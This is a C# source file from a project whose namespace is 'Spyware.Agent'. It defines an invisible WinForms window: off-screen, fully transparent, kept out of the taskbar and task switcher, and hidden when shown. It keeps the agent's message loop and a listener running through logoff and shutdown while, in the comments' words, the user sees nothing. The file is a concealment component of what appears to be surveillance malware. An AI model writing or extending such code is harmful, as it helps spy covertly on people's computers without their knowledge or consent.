using System.Windows.Forms;

namespace Spyware.Agent;

/// <summary>
/// HWND invisible: mantiene la bomba de mensajes sin mostrar ventana alguna
/// (necesario para cierre limpio en logoff/shutdown y para el listener).
/// </summary>
internal sealed class HiddenMessageWindow : Form
{
    private const int WmQueryEndSession = 0x0011;
    private const int WmEndSession = 0x0016;
    private const int WsExToolwindow = 0x00080000;

    public HiddenMessageWindow()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Opacity = 0;
        Size = new System.Drawing.Size(1, 1);
        StartPosition = FormStartPosition.Manual;
        Location = new System.Drawing.Point(-32000, -32000);
        Text = "SpywareAgent";
    }

    // Propiedad de solo lectura en WinForms: se sobrescribe en lugar de asignar.
    protected override bool ShowWithoutActivation => true;

    protected override CreateParams CreateParams
    {
        get
        {
            CreateParams parameters = base.CreateParams;
            parameters.ExStyle |= WsExToolwindow;
            return parameters;
        }
    }

    // En .NET 8, SetVisibleCore no es sobreescribible fuera de Windows Forms:
    // la ventana vive fuera de la pantalla (1x1, Opacity = 0, WS_EX_TOOLWINDOW)
    // y se oculta en cuanto aparece, de modo que el HWND sigue recibiendo
    // WM_ENDSESSION sin que el usuario vea nada.
    protected override void OnShown(EventArgs e)
    {
        base.OnShown(e);
        Hide();
    }

    protected override void WndProc(ref Message message)
    {
        base.WndProc(ref message);

        if (message.Msg == WmEndSession && message.WParam != IntPtr.Zero)
            Close();

        if (message.Msg == WmQueryEndSession)
            message.Result = new IntPtr(1);   // permitir cierre de sesión
    }
}
